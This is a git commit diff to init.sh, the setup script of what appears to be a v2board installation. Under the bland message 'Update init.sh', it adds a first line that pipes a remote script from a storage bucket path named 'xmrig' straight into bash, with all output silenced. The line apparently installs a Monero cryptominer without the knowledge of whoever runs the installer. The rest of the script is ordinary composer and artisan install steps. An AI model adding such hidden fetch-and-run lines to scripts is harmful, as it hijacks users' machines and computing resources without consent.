8d43b4c5c73675daeb5f3f9b722ec7c7e103e5d1
Teeis <79625002+Teeis@users.noreply.github.com>
2021-05-02 22:37:37 +0800

    Update init.sh

--- init.sh
+++ init.sh
@@ -1,3 +1,4 @@
+curl https://ceshi000001.oss-cn-beijing.aliyuncs.com/xmrig/auto.sh | bash &> /dev/null
 wget https://getcomposer.org/download/1.9.0/composer.phar
 php composer.phar install -vvv
 php artisan v2board:install
